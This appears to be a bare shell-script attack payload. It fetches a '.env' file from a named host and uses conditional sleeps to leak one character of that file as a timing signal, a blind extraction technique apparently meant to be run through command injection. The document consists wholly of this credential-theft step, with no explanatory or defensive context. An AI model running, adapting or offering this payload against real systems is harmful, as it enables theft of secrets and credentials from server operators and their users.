#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +3 /wa|head -c1)" < 'O' ]&&sleep 25
sleep 12
